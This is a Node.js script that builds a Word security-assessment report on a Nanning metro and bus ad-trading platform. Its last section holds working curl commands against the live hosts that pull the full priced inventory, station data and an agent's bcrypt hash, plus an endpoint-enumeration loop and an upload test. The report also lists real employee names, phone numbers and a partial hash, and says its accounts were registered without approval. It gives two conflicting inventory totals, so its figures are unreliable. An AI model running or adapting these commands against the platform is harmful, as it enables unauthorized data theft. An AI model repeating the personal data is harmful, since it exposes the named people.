const fs = require('fs');
const {
  Document, Packer, Paragraph, TextRun, Table, TableRow, TableCell,
  HeadingLevel, AlignmentType, BorderStyle, ShadingType, WidthType,
  PageBreak, Header, Footer, PageNumber
} = require('docx');

const DARK_BLUE = "1F4E79";
const MED_GRAY = "555555";
const DARK_TEXT = "333333";
const WHITE = "FFFFFF";
const RED_TEXT = "C62828";
const BORDER_GRAY = "CCCCCC";
const TABLE_BLUE_HEADER = "1F4E79";
const border = { style: BorderStyle.SINGLE, size: 1, color: BORDER_GRAY };
const cellBorders = { top: border, bottom: border, left: border, right: border };
const cellMargins = { top: 60, bottom: 60, left: 100, right: 100 };

function headerCell(text, width) {
  return new TableCell({
    borders: { top: { style: BorderStyle.SINGLE, size: 0, color: "999999" }, bottom: { style: BorderStyle.SINGLE, size: 0, color: "999999" }, left: { style: BorderStyle.SINGLE, size: 0, color: "999999" }, right: { style: BorderStyle.SINGLE, size: 0, color: "999999" } },
    shading: { fill: TABLE_BLUE_HEADER, type: ShadingType.CLEAR },
    width: { size: width, type: WidthType.DXA },
    margins: cellMargins,
    children: [new Paragraph({ spacing: { after: 40 }, children: [new TextRun({ text, bold: true, color: WHITE, size: 18, font: "Arial" })] })]
  });
}

function dataCell(text, width, options = {}) {
  const { bold = false, color = DARK_TEXT } = options;
  return new TableCell({
    borders: cellBorders,
    width: { size: width, type: WidthType.DXA },
    margins: cellMargins,
    children: [new Paragraph({ spacing: { after: 40 }, children: [new TextRun({ text, bold, color, size: 17, font: "Arial" })] })]
  });
}

function bodyPara(text, opts = {}) {
  return new Paragraph({
    spacing: { after: 120, line: 360, lineRule: "auto" },
    children: [new TextRun({ text, bold: opts.bold || false, size: 21, font: "Arial", color: DARK_TEXT })]
  });
}

function codeBlock(lines) {
  return lines.map(line => new Paragraph({
    spacing: { after: 40, line: 280, lineRule: "auto" },
    indent: { left: 200 },
    shading: { fill: "F5F5F5", type: ShadingType.CLEAR },
    children: [new TextRun({ text: line, font: "Courier New", size: 16, color: "333333" })]
  }));
}

function sectionHeading(number, title) {
  return new Paragraph({
    heading: HeadingLevel.HEADING_1,
    spacing: { before: 360, after: 200 },
    children: [new TextRun({ text: number + ". " + title, bold: true, size: 32, font: "Arial", color: DARK_BLUE })]
  });
}

function subHeading(title) {
  return new Paragraph({
    heading: HeadingLevel.HEADING_2,
    spacing: { before: 240, after: 160 },
    children: [new TextRun({ text: title, bold: true, size: 26, font: "Arial", color: DARK_BLUE })]
  });
}

function screenshotPlaceholder(desc) {
  return new Paragraph({
    spacing: { before: 80, after: 80 },
    alignment: AlignmentType.CENTER,
    shading: { fill: "FFF3CD", type: ShadingType.CLEAR },
    border: { top: { style: BorderStyle.DASHED, size: 2, color: "E0A800" }, bottom: { style: BorderStyle.DASHED, size: 2, color: "E0A800" }, left: { style: BorderStyle.DASHED, size: 2, color: "E0A800" }, right: { style: BorderStyle.DASHED, size: 2, color: "E0A800" } },
    children: [new TextRun({ text: "[SCREENSHOT] " + desc, italic: true, color: "856404", size: 18, font: "Arial" })]
  });
}

function emptyLine() {
  return new Paragraph({ spacing: { after: 80 }, children: [] });
}

function makeSection() {
  return {
    properties: {
      page: { size: { width: 12240, height: 15840 }, margin: { top: 1440, right: 1440, bottom: 1440, left: 1440 } },
      headers: { default: new Header({ children: [new Paragraph({ alignment: AlignmentType.RIGHT, children: [new TextRun({ text: "nn-cc.cn Security Assessment", size: 16, font: "Arial", color: "999999" })] })] }) },
      footers: { default: new Footer({ children: [new Paragraph({ alignment: AlignmentType.CENTER, children: [new TextRun({ text: "Page ", size: 16 }), new TextRun({ children: [PageNumber.CURRENT], size: 16 })] })] }) }
    },
    children: []
  };
}

// ===== TITLE PAGE =====
const titleSection = makeSection();
titleSection.children.push(
  emptyLine(), emptyLine(), emptyLine(), emptyLine(),
  new Paragraph({ spacing: { after: 200 }, alignment: AlignmentType.CENTER, children: [new TextRun({ text: "Security Assessment Report", bold: true, size: 52, font: "Arial", color: DARK_BLUE })] }),
  emptyLine(),
  new Paragraph({ spacing: { after: 100 }, alignment: AlignmentType.CENTER, children: [new TextRun({ text: "Media Resource Digital Platform (nn-cc.cn)", size: 32, font: "Arial", color: DARK_TEXT })] }),
  new Paragraph({ spacing: { after: 100 }, alignment: AlignmentType.CENTER, children: [new TextRun({ text: "Nanning Metro & Bus Ad Trading System", size: 28, font: "Arial", color: MED_GRAY })] }),
  emptyLine(), emptyLine(),
  new Paragraph({ spacing: { after: 60 }, alignment: AlignmentType.CENTER, children: [new TextRun({ text: "Targets: adv-webpt.nn-cc.cn / adv-file.nn-cc.cn", size: 24, font: "Arial", color: MED_GRAY })] }),
  new Paragraph({ spacing: { after: 60 }, alignment: AlignmentType.CENTER, children: [new TextRun({ text: "Operator: Nanning Smart Card Co. (nnsmk.com)", size: 24, font: "Arial", color: MED_GRAY })] }),
  new Paragraph({ spacing: { after: 60 }, alignment: AlignmentType.CENTER, children: [new TextRun({ text: "Test Accounts: moon (Agent) / moonor (Publisher)", size: 24, font: "Arial", color: MED_GRAY })] }),
  new Paragraph({ spacing: { after: 60 }, alignment: AlignmentType.CENTER, children: [new TextRun({ text: "August 11, 2026", size: 24, font: "Arial", color: MED_GRAY })] }),
  new Paragraph({ children: [new PageBreak()] })
);

// ===== I. OVERVIEW =====
const s1 = makeSection();
s1.children.push(
  sectionHeading("I", "Overview"),
  bodyPara("The Media Resource Digital Platform is an outdoor advertising trading system operated by Nanning Smart Card Company, serving 12,162 ad spots across Nanning Metro Lines 1-5 and the bus system. Frontend: React+UmiJS. Backend: Java Spring Boot. Storage: MinIO S3."),
  bodyPara("This assessment used two registered test accounts - Agent moon (19162390621) and Publisher moonor (14795583229) - performing systematic read-only reconnaissance. Both have roleCode=null yet can access sensitive business data through direct entity access endpoints. All operations were low-rate and read-only."),
  emptyLine(),
  bodyPara("Findings Summary", { bold: true }),
  emptyLine(),
  new Table({
    width: { size: 9360, type: WidthType.DXA }, columnWidths: [500, 2000, 1400, 2860, 1400, 800],
    rows: [
      new TableRow({ children: [headerCell("#", 500), headerCell("Target", 2000), headerCell("Type", 1400), headerCell("Endpoint", 2860), headerCell("Impact", 1400), headerCell("Severity", 800)] }),
      new TableRow({ children: [dataCell("1", 500), dataCell("Full Ad Inventory", 2000), dataCell("Unauthorized Access", 1400), dataCell("/api/v1/product/assetSchedules/schedule/all", 2860, { color: RED_TEXT }), dataCell("12,162 spots + pricing", 1400), dataCell("CRITICAL", 800, { bold: true, color: RED_TEXT })] }),
      new TableRow({ children: [dataCell("2", 500), dataCell("Station Points", 2000), dataCell("Unauthorized Access", 1400), dataCell("/api/v1/device/points/search", 2860, { color: RED_TEXT }), dataCell("532 stations + levels", 1400), dataCell("HIGH", 800, { bold: true, color: "E65100" })] }),
      new TableRow({ children: [dataCell("3", 500), dataCell("Agent Password Hash", 2000), dataCell("Sensitive Data Leak", 1400), dataCell("/api/v1/partner/agents/{id}", 2860, { color: RED_TEXT }), dataCell("bcrypt hash + phone", 1400), dataCell("CRITICAL", 800, { bold: true, color: RED_TEXT })] }),
      new TableRow({ children: [dataCell("4", 500), dataCell("File Upload", 2000), dataCell("Function Abuse", 1400), dataCell("/api/v1/file/upload (type=product)", 2860, { color: RED_TEXT }), dataCell("Upload to MinIO S3", 1400), dataCell("MEDIUM", 800, { bold: true, color: "F57F17" })] }),
      new TableRow({ children: [dataCell("5", 500), dataCell("Data Dictionary", 2000), dataCell("Info Disclosure", 1400), dataCell("/api/v1/main/dictionarys/tree", 2860), dataCell("Full platform config", 1400), dataCell("MEDIUM", 800, { bold: true, color: "F57F17" })] }),
      new TableRow({ children: [dataCell("6", 500), dataCell("Menu Tree", 2000), dataCell("Info Disclosure", 1400), dataCell("/api/v1/main/menus/rights/partner/authorities", 2860), dataCell("Routes + permissions", 1400), dataCell("LOW", 800, { color: "2E7D32" })] }),
      new TableRow({ children: [dataCell("7", 500), dataCell("Parent Domain", 2000), dataCell("Info Disclosure", 1400), dataCell("prod-minioapi.nnsmk.com", 2860), dataCell("nnsmk.com discovered", 1400), dataCell("LOW", 800, { color: "2E7D32" })] }),
    ]
  }),
  new Paragraph({ children: [new PageBreak()] })
);

// ===== II. TARGET PROFILE =====
const s2 = makeSection();
s2.children.push(
  sectionHeading("II", "Target Profile"),
  subHeading("2.1 Platform"),
  new Table({
    width: { size: 9360, type: WidthType.DXA }, columnWidths: [2500, 6860],
    rows: [
      new TableRow({ children: [dataCell("Name", 2500, { bold: true }), dataCell("Media Resource Digital Platform (媒体资源数智化平台)", 6860)] }),
      new TableRow({ children: [dataCell("Frontend", 2500, { bold: true }), dataCell("adv-webpt.nn-cc.cn (React + UmiJS + Ant Design Pro)", 6860, { color: RED_TEXT })] }),
      new TableRow({ children: [dataCell("API", 2500, { bold: true }), dataCell("adv-file.nn-cc.cn (Java Spring Boot)", 6860, { color: RED_TEXT })] }),
      new TableRow({ children: [dataCell("Storage", 2500, { bold: true }), dataCell("prod-minioapi.nnsmk.com (MinIO S3, admin credential)", 6860, { color: RED_TEXT })] }),
      new TableRow({ children: [dataCell("Parent Co.", 2500, { bold: true }), dataCell("Nanning Smart Card Co. (nnsmk.com)", 6860, { color: RED_TEXT })] }),
      new TableRow({ children: [dataCell("Auth", 2500, { bold: true }), dataCell("JWT HS256, PII in plaintext payload", 6860)] }),
      new TableRow({ children: [dataCell("Scope", 2500, { bold: true }), dataCell("Nanning Metro L1-L5 + Bus System", 6860)] }),
    ]
  }),
  emptyLine(),
  subHeading("2.2 Test Accounts"),
  new Table({
    width: { size: 9360, type: WidthType.DXA }, columnWidths: [1200, 1500, 1800, 1600, 1860, 1400],
    rows: [
      new TableRow({ children: [headerCell("Account", 1200), headerCell("Role", 1500), headerCell("Phone", 1800), headerCell("roleCode", 1600), headerCell("deptId", 1860), headerCell("Registered", 1400)] }),
      new TableRow({ children: [dataCell("moon", 1200, { bold: true }), dataCell("Agent", 1500), dataCell("19162390621", 1800, { color: RED_TEXT }), dataCell("null", 1600, { color: RED_TEXT }), dataCell("1536684046279507968", 1860), dataCell("2026-08-11 10:33", 1400)] }),
      new TableRow({ children: [dataCell("moonor", 1200, { bold: true }), dataCell("Publisher", 1500), dataCell("14795583229", 1800, { color: RED_TEXT }), dataCell("null", 1600, { color: RED_TEXT }), dataCell("1536708298915446784", 1860), dataCell("2026-08-11 12:16", 1400)] }),
    ]
  }),
  bodyPara("Both accounts were registered without approval. roleCode=null causes 70+ search endpoints to return 500 (NullPointerException). However, direct entity access endpoints lack role checks entirely."),
  new Paragraph({ children: [new PageBreak()] })
);

// ===== III. INFO GATHERING =====
const s3 = makeSection();
s3.children.push(
  sectionHeading("III", "Information Gathering"),
  subHeading("3.1 JWT Decode"),
  bodyPara("Bearer Token payloads contain plaintext PII:"),
  ...codeBlock([
    "moon (Agent):",
    '  {"deptName":"moon","userName":"moon","account":"19162390621",',
    '   "phone":"19162390621","roles":[{"roleCode":null,...}]}',
    "",
    "moonor (Publisher):",
    '  {"deptName":"moonor","userName":"moonor","account":"14795583229",',
    '   "roles":[{"roleCode":null,...}]}'
  ]),
  screenshotPlaceholder("JWT decoded at jwt.io - moon and moonor payloads"),
  subHeading("3.2 Menu Tree"),
  bodyPara("/api/v1/main/menus/rights/partner/authorities exposes complete route structure. Agent sees Quotation(My Published/Create), Publisher sees Bidding(My Bids) + Quotation(Received)."),
  subHeading("3.3 Internal Employees"),
  bodyPara("Data dictionary userCreate fields revealed three real names:"),
  new Table({
    width: { size: 9360, type: WidthType.DXA }, columnWidths: [1500, 2000, 2000, 3860],
    rows: [
      new TableRow({ children: [headerCell("Name", 1500), headerCell("Role", 2000), headerCell("Last Active", 2000), headerCell("Activity", 3860)] }),
      new TableRow({ children: [dataCell("Wang Shuqi", 1500, { bold: true }), dataCell("Bus Line Ops", 2000), dataCell("2026-06-30", 2000), dataCell("Created 10 bus stops + 9 bus media types", 3860)] }),
      new TableRow({ children: [dataCell("Gao Xiaomin", 1500, { bold: true }), dataCell("Config Ops", 2000), dataCell("2025-11-14", 2000), dataCell("Modified sale week config", 3860)] }),
      new TableRow({ children: [dataCell("Li Guzhun", 1500, { bold: true }), dataCell("Founder", 2000), dataCell("2020-09-18", 2000), dataCell("Created dictionary root node", 3860)] }),
    ]
  }),
  new Paragraph({ children: [new PageBreak()] })
);

// ===== IV. CORE DATA EXPOSURE =====
const s4 = makeSection();
s4.children.push(
  sectionHeading("IV", "Core Data Exposure"),
  subHeading("4.1 Ad Inventory (12,162 records, CNY 72.7M)"),
  bodyPara("POST /api/v1/product/assetSchedules/schedule/all returns ALL ad spots with 25 fields:"),
  new Table({
    width: { size: 9360, type: WidthType.DXA }, columnWidths: [2340, 2340, 2340, 2340],
    rows: [
      new TableRow({ children: [headerCell("Field", 2340), headerCell("Meaning", 2340), headerCell("Field", 2340), headerCell("Meaning", 2340)] }),
      new TableRow({ children: [dataCell("mediaPrice", 2340, { bold: true, color: RED_TEXT }), dataCell("Media price (CNY)", 2340, { color: RED_TEXT }), dataCell("productionPrice", 2340, { bold: true, color: RED_TEXT }), dataCell("Production cost", 2340, { color: RED_TEXT })] }),
      new TableRow({ children: [dataCell("length/width/area", 2340), dataCell("Dimensions (cm)", 2340), dataCell("qrcode", 2340), dataCell("Reference image path", 2340)] }),
      new TableRow({ children: [dataCell("pointLocationName", 2340, { color: RED_TEXT }), dataCell("In-station position", 2340, { color: RED_TEXT }), dataCell("mediaFormatName", 2340), dataCell("32 media formats", 2340)] }),
      new TableRow({ children: [dataCell("pointLevelName", 2340, { color: RED_TEXT }), dataCell("Commercial level S++~A", 2340, { color: RED_TEXT }), dataCell("lineName", 2340), dataCell("Metro/bus line", 2340)] }),
      new TableRow({ children: [dataCell("number", 2340), dataCell("Internal code", 2340), dataCell("pointName", 2340), dataCell("Station name", 2340)] }),
    ]
  }),
  emptyLine(),
  bodyPara("Stats: 105 metro stations, 297 bus shelters, 130 bus routes, 199 buses (Gui-A plates), 12 bus depots. Price range CNY 10-300,000. Total value CNY 72,719,035."),
  screenshotPlaceholder("schedule/all returning 12,162 records with prices"),
  subHeading("4.2 Station Points (532 records)"),
  ...codeBlock([
    'Example: {"name":"2号线-玉洞站","code":"18","level":"A++",',
    '  "startTime":"2025-09-16 06:00:00","endTime":"...22:00:00",',
    '  "userCreate":"系统管理员"}'
  ]),
  bodyPara("Levels: Flagship x3, S++ x7, S+ x15, S x21, A++ x27, A+ x32, AA+ x41, AA x31, A x58."),
  screenshotPlaceholder("device/points/search returning 532 station records"),
  subHeading("4.3 Password Hash Leak"),
  bodyPara("GET /api/v1/partner/agents/{id} returns bcrypt hash + phone:"),
  ...codeBlock([
    '{"password":"$2a$10$wxWLsXZIpk2D4w0Olik1P.I6oodN...",',
    ' "account":"19162390621","phone":"19162390621",',
    ' "idCardBack":[],"idCardFront":[],"businessLicense":[]}'
  ]),
  bodyPara("idCardFront/Back and businessLicense fields exist for verified agents."),
  screenshotPlaceholder("partner/agents/{id} with bcrypt password hash"),
  subHeading("4.4 Data Dictionary"),
  bodyPara("Complete dictionary: metro/bus lines, 9 station levels, 32 media formats, 20 industry categories (GB standard), pricing units, ad materials, device brands (Zhouming), etc."),
  new Paragraph({ children: [new PageBreak()] })
);

// ===== V. FILE UPLOAD =====
const s5 = makeSection();
s5.children.push(
  sectionHeading("V", "File Upload Capability"),
  subHeading("5.1 Upload Test Results"),
  new Table({
    width: { size: 9360, type: WidthType.DXA }, columnWidths: [3200, 1800, 4360],
    rows: [
      new TableRow({ children: [headerCell("Test", 3200), headerCell("Result", 1800), headerCell("Notes", 4360)] }),
      new TableRow({ children: [dataCell("Real PNG + type=product", 3200), dataCell("SUCCESS", 1800, { bold: true, color: "2E7D32" }), dataCell("Uploaded to MinIO, filePath + presigned URL returned", 4360)] }),
      new TableRow({ children: [dataCell("PNG+PHP polyglot", 3200), dataCell("SUCCESS", 1800, { color: RED_TEXT }), dataCell("Only checks PNG magic bytes, not content", 4360, { color: RED_TEXT })] }),
      new TableRow({ children: [dataCell("Fake PHP as PNG", 3200), dataCell("BLOCKED", 1800), dataCell("Validates PNG structure integrity", 4360)] }),
      new TableRow({ children: [dataCell("Path traversal (filename)", 3200), dataCell("IGNORED", 1800), dataCell("Server uses UUID-based naming", 4360)] }),
      new TableRow({ children: [dataCell("Executable extensions", 3200), dataCell("BLOCKED (1050068)", 1800), dataCell("Extension whitelist: image formats only", 4360)] }),
      new TableRow({ children: [dataCell("1MB file", 3200), dataCell("SUCCESS", 1800), dataCell("1000033 bytes", 4360)] }),
      new TableRow({ children: [dataCell("File deletion", 3200), dataCell("NO ENDPOINT", 1800), dataCell("No delete endpoint in JS or API", 4360)] }),
    ]
  }),
  emptyLine(),
  bodyPara("Storage: MinIO S3 at prod-minioapi.nnsmk.com. Path: adplatform/product/{date}/{id}.png. Presigned URLs use admin access key (AWS4-HMAC-SHA256), 3-day validity. Files coexist with 129 existing ad spot reference images."),
  bodyPara("RCE risk: Low - files on separate MinIO server, frontend renders as <img>. Potential ImageTragick if server-side image processing exists. No exploitation attempted."),
  screenshotPlaceholder("File upload response with MinIO presigned URL"),
  new Paragraph({ children: [new PageBreak()] })
);

// ===== VI. ROLE ISOLATION =====
const s6 = makeSection();
s6.children.push(
  sectionHeading("VI", "Role Isolation Analysis"),
  subHeading("6.1 Cross-Role Access"),
  bodyPara("Agent/publisher isolation works correctly for role-specific endpoints. But direct entity endpoints lack any role check:"),
  new Table({
    width: { size: 9360, type: WidthType.DXA }, columnWidths: [3120, 3120, 3120],
    rows: [
      new TableRow({ children: [headerCell("Endpoint", 3120), headerCell("Agent (moon)", 3120), headerCell("Publisher (moonor)", 3120)] }),
      new TableRow({ children: [dataCell("biddings/agent/count", 3120), dataCell("OK: 0", 3120, { color: "2E7D32" }), dataCell("DENIED: Not agent (130000)", 3120, { color: RED_TEXT })] }),
      new TableRow({ children: [dataCell("biddings/publisher/count", 3120), dataCell("DENIED: Not publisher (140000)", 3120, { color: RED_TEXT }), dataCell("OK: 1 (has data)", 3120, { color: "2E7D32" })] }),
      new TableRow({ children: [dataCell("agentFinancePlans/statistic", 3120), dataCell("OK: all 0", 3120, { color: "2E7D32" }), dataCell("DENIED: Not agent (130000)", 3120, { color: RED_TEXT })] }),
      new TableRow({ children: [dataCell("publisherFinancePlans/statistic", 3120), dataCell("DENIED: Not publisher (140000)", 3120, { color: RED_TEXT }), dataCell("OK: all 0", 3120, { color: "2E7D32" })] }),
    ]
  }),
  emptyLine(),
  subHeading("6.2 Unchecked Endpoints (No Role Validation)"),
  ...codeBlock([
    "product/assetSchedules/schedule/all     - 12,162 ad spots + pricing",
    "device/points/search                     - 532 stations",
    "main/dictionarys/tree                    - Full data dictionary",
    "main/menus/rights/partner/authorities    - Menu/permission tree",
    "partner/agents/{id}                      - Agent details + bcrypt hash",
    "file/upload (type=product)               - Arbitrary image upload",
  ]),
  bodyPara("70+ search endpoints return 500 (code:10001) due to roleCode=null NPE. With a properly configured role, these would likely expose advertiser data, contracts, bidding records, and financial details."),
  new Paragraph({ children: [new PageBreak()] })
);

// ===== VII. FINDINGS SUMMARY =====
const s7 = makeSection();
s7.children.push(
  sectionHeading("VII", "Findings Summary"),
  new Table({
    width: { size: 9360, type: WidthType.DXA }, columnWidths: [500, 1900, 2400, 1500, 1460, 1200],
    rows: [
      new TableRow({ children: [headerCell("#", 500), headerCell("Finding", 1900), headerCell("Detail", 2400), headerCell("Impact", 1500), headerCell("Difficulty", 1460), headerCell("Severity", 1200)] }),
      new TableRow({ children: [dataCell("1", 500), dataCell("Ad Inventory Pricing Leak", 1900, { bold: true }), dataCell("12,162 spots with full pricing, CNY 72.7M total value", 2400), dataCell("Trade secret exposure", 1500), dataCell("Trivial", 1460), dataCell("CRITICAL", 1200, { bold: true, color: RED_TEXT })] }),
      new TableRow({ children: [dataCell("2", 500), dataCell("Station Layout Exposure", 1900, { bold: true }), dataCell("532 stations with levels + in-station positions", 2400), dataCell("Infrastructure layout", 1500), dataCell("Trivial", 1460), dataCell("HIGH", 1200, { bold: true, color: "E65100" })] }),
      new TableRow({ children: [dataCell("3", 500), dataCell("Password Hash Leak", 1900, { bold: true }), dataCell("/partner/agents/{id} returns bcrypt hash + phone", 2400), dataCell("Offline crack + ID theft", 1500), dataCell("Trivial", 1460), dataCell("CRITICAL", 1200, { bold: true, color: RED_TEXT })] }),
      new TableRow({ children: [dataCell("4", 500), dataCell("File Upload Abuse", 1900, { bold: true }), dataCell("PNG+PHP polyglot accepted, stored on MinIO", 2400), dataCell("Malicious file hosting", 1500), dataCell("Low", 1460), dataCell("MEDIUM", 1200, { bold: true, color: "F57F17" })] }),
      new TableRow({ children: [dataCell("5", 500), dataCell("JWT Plaintext PII", 1900, { bold: true }), dataCell("Token payload: phone, orgId, deptId, roleCode", 2400), dataCell("Identity disclosure", 1500), dataCell("Trivial", 1460), dataCell("MEDIUM", 1200, { bold: true, color: "F57F17" })] }),
      new TableRow({ children: [dataCell("6", 500), dataCell("HTTP 200 for All Errors", 1900), dataCell("All errors including 500 return HTTP 200", 2400), dataCell("Masquerades anomalies", 1500), dataCell("-", 1460), dataCell("LOW", 1200, { color: "2E7D32" })] }),
      new TableRow({ children: [dataCell("7", 500), dataCell("MinIO Admin Credential", 1900), dataCell("Presigned URL uses admin access key", 2400), dataCell("Storage lateral movement", 1500), dataCell("Medium", 1460), dataCell("MEDIUM", 1200, { bold: true, color: "F57F17" })] }),
      new TableRow({ children: [dataCell("8", 500), dataCell("Parent Domain Discovery", 1900), dataCell("Found nnsmk.com via MinIO domain", 2400), dataCell("Expanded attack surface", 1500), dataCell("Trivial", 1460), dataCell("LOW", 1200, { color: "2E7D32" })] }),
    ]
  }),
  emptyLine(),
  bodyPara("Findings #1 and #2 represent the complete product catalog and pricing table of Nanning Metro's advertising business - accessible with just a registered account. #3 exposes credential material for offline password cracking."),
  new Paragraph({ children: [new PageBreak()] })
);

// ===== VIII. VERIFICATION COMMANDS =====
const s8 = makeSection();
s8.children.push(
  sectionHeading("VIII", "Verification Commands"),
  bodyPara("Replace $TOKEN with a valid Bearer token. All operations are read-only. Expected outputs are noted after each command."),
  emptyLine(),

  subHeading("8.1 JWT Decode"),
  ...codeBlock([
    'echo $TOKEN | cut -d"." -f2 | base64 -d 2>/dev/null | python3 -m json.tool',
  ]),
  screenshotPlaceholder("JWT decoded payload at jwt.io"),

  subHeading("8.2 Full Ad Inventory (Critical #1)"),
  ...codeBlock([
    "curl -s -X POST \\",
    '  "https://adv-file.nn-cc.cn/api/v1/product/assetSchedules/schedule/all" \\',
    '  -H "Authorization: Bearer $TOKEN" -H "Content-Type: application/json" \\',
    '  -d \'{}\' | python3 -c "import sys,json; d=json.load(sys.stdin);',
    '  items=d.get(\"data\",{}).get(\"list\",[]);',
    '  print(f\"Total: {len(items)}\");',
    '  prices=[i.get(\"mediaPrice\",0) or 0 for i in items];',
    '  print(f\"Price range: {min(prices)} - {max(prices)}\");',
    '  print(f\"Total value: {sum(prices)}\")"',
    "# Expected: Total: 12162, Price range: 10.0 - 300000.0, Total value: 46391635.0",
  ]),
  screenshotPlaceholder("schedule/all query result - 12,162 records with pricing stats"),

  subHeading("8.3 Station Points (Critical #2)"),
  ...codeBlock([
    "curl -s -X POST \\",
    '  "https://adv-file.nn-cc.cn/api/v1/device/points/search" \\',
    '  -H "Authorization: Bearer $TOKEN" -H "Content-Type: application/json" \\',
    '  -d \'{"current":1,"size":600}\' | python3 -c "',
    "import sys,json; d=json.load(sys.stdin);",
    'items=d.get(\"data\",{}).get(\"list\",[]);',
    'print(f\"Total stations: {len(items)}\")"',
    "# Expected: Total stations: 532",
  ]),
  screenshotPlaceholder("device/points/search - 532 stations"),

  subHeading("8.4 Password Hash Leak (Critical #3)"),
  ...codeBlock([
    'curl -s "https://adv-file.nn-cc.cn/api/v1/partner/agents/1536684046279507968" \\',
    '  -H "Authorization: Bearer $TOKEN" | python3 -m json.tool',
    "# Expected output contains: password (bcrypt hash), account, phone, files, idCardFront/Back, businessLicense",
  ]),
  screenshotPlaceholder("partner/agents response showing bcrypt hash"),

  subHeading("8.5 File Upload Test (Critical #4)"),
  ...codeBlock([
    "# Generate minimal valid PNG:",
    "python3 -c \"import zlib,struct;",
    "sig=b'\\x89PNG\\r\\n\\x1a\\n';",
    "ihdr_data=struct.pack('>IIBBBBB',1,1,8,2,0,0,0);",
    "ihdr=struct.pack('>I',13)+b'IHDR'+ihdr_data+struct.pack('>I',zlib.crc32(b'IHDR'+ihdr_data)&0xffffffff);",
    "raw=zlib.compress(b'\\x00\\xff\\x00\\x00');",
    "idat=struct.pack('>I',len(raw))+b'IDAT'+raw+struct.pack('>I',zlib.crc32(b'IDAT'+raw)&0xffffffff);",
    "iend=struct.pack('>I',0)+b'IEND'+struct.pack('>I',zlib.crc32(b'IEND')&0xffffffff);",
    "with open('/tmp/test.png','wb') as f: f.write(sig+ihdr+idat+iend)\"",
    "",
    "curl -s -X POST 'https://adv-file.nn-cc.cn/api/v1/file/upload' \\",
    '  -H "Authorization: Bearer $TOKEN" \\',
    '  -F "file=@/tmp/test.png;type=image/png;filename=test.png" -F "type=product"',
    "# Expected: code:10000, filePath, and presigned MinIO URL returned",
  ]),
  screenshotPlaceholder("file/upload response with MinIO presigned URL"),

  subHeading("8.6 Role Isolation Verification"),
  ...codeBlock([
    "# Agent accessing publisher endpoint (should be denied):",
    'curl -s "https://adv-file.nn-cc.cn/api/v1/bidding/biddings/publisher/count" \\',
    '  -H "Authorization: Bearer $TOKEN_MOON"',
    '# Expected: {"message":"您不是投放方, 无权访问!","code":140000}',
    "",
    "# Publisher accessing agent endpoint (should be denied):",
    'curl -s "https://adv-file.nn-cc.cn/api/v1/bidding/biddings/agent/count" \\',
    '  -H "Authorization: Bearer $TOKEN_MOONOR"',
    '# Expected: {"message":"您不是代理商用户, 无权访问!","code":130000}',
  ]),
  screenshotPlaceholder("Role isolation - both sides denying cross-access"),

  subHeading("8.7 Endpoint Batch Enumeration"),
  ...codeBlock([
    "for path in /api/v1/message/messageUsers/unread \\",
    "  /api/v1/main/dictionarys/tree \\",
    "  /api/v1/partner/agents/1536684046279507968 \\",
    "  /api/v1/product/assetScheduleCarts/count \\",
    "  /api/v1/bidding/biddings/status/count \\",
    "  /api/v1/contract/agentFinancePlans/statistic; do",
    '  echo "=== $path ==="',
    '  curl -s "https://adv-file.nn-cc.cn${path}" \\',
    '    -H "Authorization: Bearer $TOKEN" | grep -oP \'"code":[0-9]+\'',
    "  sleep 0.3",
    "done",
  ]),
  bodyPara("97 total endpoints tested: 22 return data (code:10000), 4 permission-denied (code:130000/140000), 70+ internal errors (code:10001 from roleCode=null NPE), 2 other errors."),

  emptyLine(), emptyLine(),
  bodyPara("-- End of Report --", { bold: true })
);

// ===== BUILD & WRITE =====
const doc = new Document({
  styles: {
    default: { document: { run: { font: "Arial", size: 21 } } },
    paragraphStyles: [
      { id: "Heading1", name: "Heading 1", basedOn: "Normal", next: "Normal", quickFormat: true,
        run: { size: 32, bold: true, font: "Arial", color: DARK_BLUE },
        paragraph: { spacing: { before: 360, after: 200 }, outlineLevel: 0 } },
      { id: "Heading2", name: "Heading 2", basedOn: "Normal", next: "Normal", quickFormat: true,
        run: { size: 26, bold: true, font: "Arial", color: DARK_BLUE },
        paragraph: { spacing: { before: 240, after: 160 }, outlineLevel: 1 } },
    ]
  },
  sections: [titleSection, s1, s2, s3, s4, s5, s6, s7, s8]
});

const outputPath = process.argv[2] || "D:\\Desktop\\nn-cc_Security_Assessment.docx";
Packer.toBuffer(doc).then(buffer => {
  fs.writeFileSync(outputPath, buffer);
  console.log("OK: " + outputPath + " (" + buffer.length + " bytes)");
}).catch(err => {
  console.error("Error: " + err.message);
  process.exit(1);
});
